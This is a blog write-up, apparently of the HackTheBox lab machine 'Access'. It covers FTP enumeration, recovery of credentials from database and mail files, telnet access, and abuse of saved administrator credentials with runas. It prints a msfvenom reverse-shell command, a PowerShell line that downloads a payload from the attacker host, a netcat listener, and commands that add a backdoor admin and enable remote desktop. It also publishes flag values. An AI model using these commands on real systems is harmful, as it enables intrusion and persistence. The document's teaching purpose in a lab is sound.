---
layout: post
title: Access - HacktheBox
date: 2018-11-22 16:49
author: rowbot
comments: true
categories: [Hackthebox]
---
<!-- wp:paragraph -->
<p><strong>Skills Required</strong><br>Basic knowledge of Linux<br>GoogleFu<br></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Skills Learned</strong><br>Telnet<br>Taking advantage of saved credentials<br><br></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">START<br></pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>nmap -sC -sV -oA all -vv -p- 10.10.10.98</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":430} -->
<figure class="wp-block-image"><img src="http://offsecnewbie.com/wp-content/uploads/2018/11/ports.png" alt="" class="wp-image-430"/><figcaption>ports after full nmap scan</figcaption></figure>
<!-- /wp:image -->

<!-- wp:image {"id":453} -->
<figure class="wp-block-image"><img src="http://offsecnewbie.com/wp-content/uploads/2018/11/dc.png" alt="" class="wp-image-453"/><figcaption>only thing on the index page</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>I did a dirbuster search and nikto but they both revealed nothing of use. I always check these first as they take time to run. So I can get them running and move on. Now to do a nmap FTP scan.<br></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">[<strong>root</strong>:~/htb/access/writeup]# nmap --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 10.10.10.98
Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-22 14:47 GMT
NSE: [ftp-bounce] PORT response: 501 Server cannot accept argument.
Nmap scan report for 10.10.10.98
Host is up, received echo-reply ttl 127 (0.036s latency).

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 127
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.

Nmap done: 1 IP address (1 host up) scanned in 22.19 seconds
[<strong>root</strong>:~/htb/access/writeup]# 
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>So anonymous FTP login is available! Directory listing is not possible this way for some reason. Lets check for files using FileZilla!<br></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":432} -->
<figure class="wp-block-image"><img src="http://offsecnewbie.com/wp-content/uploads/2018/11/filezilla.png" alt="" class="wp-image-432"/><figcaption>Pulled backup.mdb and Access Control.zip back to kali<br><br></figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>2 folders and 2 files found. Inside Engineer file - a zip file called Access Control.zip and inside backup folder - backup.mdb.<br></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":436} -->
<figure class="wp-block-image"><img src="http://offsecnewbie.com/wp-content/uploads/2018/11/password-protected.png" alt="" class="wp-image-436"/><figcaption>I tried to open Access Control.zip but it was password protected. </figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>I'm gonna assume the password is within the other file somewhere. If stuck not knowing what a file type is I always refer to Google!</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":437} -->
<figure class="wp-block-image"><img src="http://offsecnewbie.com/wp-content/uploads/2018/11/whatis.png" alt="" class="wp-image-437"/><figcaption>what is .mdb file.&nbsp;</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>I searched to see if there was an easy way to view the contents of the file and found a useful site - <a href="https://www.mdbopener.com/ ">https://www.mdbopener.com/ </a><br></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":439} -->
<figure class="wp-block-image"><img src="http://offsecnewbie.com/wp-content/uploads/2018/11/lots-of-tables.png" alt="" class="wp-image-439"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>I found a table called "auth user" - seems interesting. Opened it and there are 3 entries</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":440} -->
<figure class="wp-block-image"><img src="http://offsecnewbie.com/wp-content/uploads/2018/11/engineer.png" alt="" class="wp-image-440"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Using the engineer password I extracted the contents of Access Control.zip to give me a .pst file. Back to Google! <br></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":441} -->
<figure class="wp-block-image"><img src="http://offsecnewbie.com/wp-content/uploads/2018/11/pstfile.png" alt="" class="wp-image-441"/><figcaption>Looks like a file Outlook would use</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>So it looks like a saved email. I don't want to have to use Outlook to view it so I check Google once again for an easier way. <a href="https://www.pdfen.com/convert-to-pdf/pst-to-pdf">https://www.pdfen.com/convert-to-pdf/pst-to-pdf </a><br></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":444} -->
<figure class="wp-block-image"><img src="http://offsecnewbie.com/wp-content/uploads/2018/11/email.png" alt="" class="wp-image-444"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>So there is a user account on this box called 'security' with a password '4Cc3ssC0ntr0ller'. Okay so how do I login? Lets try FTP. Back to Filezilla!<br></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">Command:    USER engineer<br>Response:    331 Password required for engineer.<br>Command:    PASS **<br>Response:    530 User cannot log in.</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>Okay that didn't work so I tried telnet<br></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":447} -->
<figure class="wp-block-image"><img src="http://offsecnewbie.com/wp-content/uploads/2018/11/telnet.png" alt="" class="wp-image-447"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":449} -->
<figure class="wp-block-image"><img src="http://offsecnewbie.com/wp-content/uploads/2018/11/addingtelnet-creds.png" alt="" class="wp-image-449"/><figcaption>Adding creds to Pentest.ws</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>What type and build of server am I connected to?<br></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">C:\temp\scripts&gt;systeminfo                                                                                                                                           [102/1437]<br>Host Name:                 ACCESS         <br>OS Name:                   Microsoft Windows Server 2008 R2 Standard<br>OS Version:                6.1.7600 N/A Build 7600<br>OS Manufacturer:           Microsoft Corporation<br>OS Configuration:          Standalone Server<br>OS Build Type:             Multiprocessor Free<br>Registered Owner:          Windows User   <br>Registered Organization:                  <br>Product ID:                55041-507-9857321-84191<br>Original Install Date:     8/21/2018, 9:43:10 PM<br>System Boot Time:          11/22/2018, 2:47:46 PM<br>System Manufacturer:       VMware, Inc.   <br>System Model:              VMware Virtual Platform<br>System Type:               x64-based PC   </pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>Captured user.txt file <br></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">C:\Users\security\Desktop&gt;type user.txt<br>ff1f3b48913b213a31ff6756d2553d38<br>C:\Users\security\Desktop&gt;</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>So I browsed around uploaded nc.exe but could not executed it. It looks like scripts and executables are blocked.<br></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">This program is blocked by group policy. For more information, contact your system administrator.</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>I started to look for files/folders which are not in the standard Windows install - and found this: <br></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">C:\ZKTeco&gt;dir<br> Volume in drive C has no label.<br> Volume Serial Number is 9C45-DBF0<br>Directory of C:\ZKTeco<br>08/22/2018  07:23 AM    <br>          .<br>08/22/2018  07:23 AM              ..<br>08/23/2018  10:56 PM              ZKAccess3.5<br>               0 File(s)              0 bytes<br>               3 Dir(s)  16,771,903,488 bytes free<br>C:\ZKTeco&gt;</pre>
<!-- /wp:preformatted -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">[root:~/htb/access]# searchsploit ZKAccess<br><br>Exploit Title                                                                                                                                    <br>ZKTeco ZKAccess Professional 3.5.3 - Insecure File Permissions Privilege Escalation                                                                        </pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>To save you reading about me struggling with this part&nbsp; - it turned out to be a rabbit hole. I knew it was the wrong version but sometimes the vulnerability might be in the older version as well, so it was worth a shot</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>I poked about and found a scripts folder with vbs scripts... interesting - especially the readme_first.txt.<br></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">C:\temp\scripts&gt;dir<br> Volume in drive C has no label.<br> Volume Serial Number is 9C45-DBF0<br>Directory of C:\temp\scripts<br>08/21/2018  10:25 PM    <br>          .<br>08/21/2018  10:25 PM              ..<br>08/21/2018  10:30 PM               157 1_CREATE_SYSDBA.sql<br>08/21/2018  10:30 PM                90 2_ALTER_SERVER_ROLE.sql<br>08/21/2018  10:30 PM               300 3_SP_ATTACH_DB.sql<br>08/21/2018  10:30 PM               100 4_ALTER_AUTHORIZATION.sql<br>08/21/2018  10:30 PM             1,802 README_FIRST.txt<br>03/12/2018  01:37 PM             5,013 RestartServiceByDescriptionNameLike.vbs<br>03/12/2018  01:37 PM             1,998 SetAccessRuleOnDirectory.vbs<br>03/12/2018  01:37 PM            26,624 sqlcommand.exe<br>03/12/2018  01:37 PM             3,855 SQLOpenFirewallPorts.vbs<br>03/12/2018  01:37 PM             5,277 SQLServerCfgPort.vbs<br>              10 File(s)         45,216 bytes<br>               2 Dir(s)  16,771,903,488 bytes free</pre>
<!-- /wp:preformatted -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">README_FIRST.txt<br>"Login:" = "sa"<br>"Password:" = "htrcy@HXeryNJCTRHcnb45CJRY"</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>Looks like SQL db user &amp; password<br></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>I checked to see if any saved creds. A lazy admin would save credentials using cmdkey. It creates, lists, and deletes stored user names and passwords or credentials.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":462} -->
<figure class="wp-block-image"><img src="http://offsecnewbie.com/wp-content/uploads/2018/11/creds.png" alt="" class="wp-image-462"/><figcaption>always noting the creds I capture</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>So this admin seems to be quite lazy - including the password inside this file. I check to see if he has saved any credentials to the machine and bingo!<br></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">C:\temp\scripts&gt;cmdkey /list<br>Currently stored credentials:<br><code>Target: Domain:interactive=ACCESS\Administrator                                                   Type: Domain PasswordUser: ACCESS\Administrator</code><br>C:\temp\scripts&gt;</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>So the Administrator password is stored! </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>I wanted to upgrade to a proper shell as using Telnet is very difficult to use due to not being able to delete letters or press up on the keyboard to replay things in the buffer.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>So know thing that .exes cant be run and that there are .vbs files in the scripts folder&nbsp; - maybe the user can run .vbs files?<br></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.234 LPORT=443 --platform windows -a x64 -f vbs -o shell.vbs</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>I created a .vbs file, downloaded it to the server and tried to run it but no luck - looks like .vbs files can only be run by the administrator.<br></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.234/shell.vbs','C:\temp\scripts\shell.vbs')"</pre>
<!-- /wp:preformatted -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">C:\temp\scripts&gt;shell.vbs<br>Access is denied.<br>C:\temp\scripts&gt;</pre>
<!-- /wp:preformatted -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">For the vbs scripts: <br>Go to windows Services and stop ALL SQL related services.<br>Open command prompt with elevated privileges (Administrator).<br>paste the following commands in command prompt for each script and click ENTER…<br>1. cmd.exe /c WScript.exe "c:\temp\scripts\SQLOpenFirewallPorts.vbs" "C:\Windows\system32" "c:\temp\logs\"</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>I need to use the runas command as it has a flag /savecreds which takes advantage of the administrator saved creds on the system. <br></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>So following the guide in the README_FIRST.txt I created this runas command with a nc listener on port 443.<br></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">runas /user:Administrator /noprofile /savecred "cmd.exe /c WScript.exe "c:\temp\scripts\shell.vbs""</pre>
<!-- /wp:preformatted -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">[root:~/htb]# nc -lnvp 443<br>listening on [any] 443 …<br>connect to [10.10.14.234] from (UNKNOWN) [10.10.10.98] 49158<br>Microsoft Windows [Version 6.1.7600]<br>Copyright (c) 2009 Microsoft Corporation.  All rights reserved.<br>C:\Windows\system32&gt;type c:\users\administrator\desktop\root.txt<br>type c:\users\administrator\desktop\root.txt<br>Access is denied.<br>C:\Windows\system32&gt;whoami<br>whoami<br>access\administrator<br>C:\Windows\system32&gt;</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>So I got connected but strangely I could not read the root.txt file even though I'm logged in as administrator. I always find it easier to work with remote desktop. I know its very noisy but for this final bit its worth it. </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>I created a new user called test with password TotallySec123</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">C:\Users\Administrator\Desktop&gt;net user test TotallySec123 /add<br>net user test TotallySec123 /add<br>The command completed successfully.<br>C:\Users\Administrator\Desktop&gt;net localgroup administrators test /add<br>net localgroup administrators test /add<br>The command completed successfully.</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>To enable remote desktop I ran the following as Administrator:<code><br></code></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0<br>netsh firewall set service remoteadmin enable<br>netsh firewall set service remotedesktop enable</pre>
<!-- /wp:preformatted -->

<!-- wp:image {"id":464} -->
<figure class="wp-block-image"><img src="http://offsecnewbie.com/wp-content/uploads/2018/11/rdesktop.png" alt="" class="wp-image-464"/><figcaption>logged on as test with password TotallySec123</figcaption></figure>
<!-- /wp:image -->

<!-- wp:image {"id":465} -->
<figure class="wp-block-image"><img src="http://offsecnewbie.com/wp-content/uploads/2018/11/rootfile.png" alt="" class="wp-image-465"/><figcaption>root.txt file is green</figcaption></figure>
<!-- /wp:image -->

<!-- wp:image {"id":467} -->
<figure class="wp-block-image"><img src="http://offsecnewbie.com/wp-content/uploads/2018/11/encrpyted.png" alt="" class="wp-image-467"/><figcaption>the file is encrypted&nbsp;</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>It looks like the contexts can be indexed.<br></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>I uploaded a meterpreter shell to priv esc to nt authority\system to see if could view the contents of the file but unfortunately I couldn't.<br></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">C:\Users\Administrator\Desktop&gt;whoami<br>whoami<br>nt authority\system<br>C:\Users\Administrator\Desktop&gt;type root.txt<br>type root.txt<br>Access is denied.<br>C:\Users\Administrator\Desktop&gt;</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>I tried to use powershell to view the contents.<br></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">C:\Users\Administrator\Desktop&gt;powershell -nologo "&amp; "Get-Content root.txt"<br>Get-Content : Access to the path 'C:\Users\Administrator\Desktop\root.txt' is denied.<br></pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>I'm really not sure whats going on here. Hopefully some one can enlighten me. I managed to get root by changing the administrator password, enabling Remote Desktop logging in, running the ZkAccess program, exiting Remote Desktop then viewing the text file as below:<br></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">C:\Users\Administrator\Desktop&gt;type root.txt<br>
type root.txt<br>
6e1586cc7ab230a8d297e8f933d904cf<br>
C:\Users\Administrator\Desktop&gt;</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p><br></p>
<!-- /wp:paragraph -->
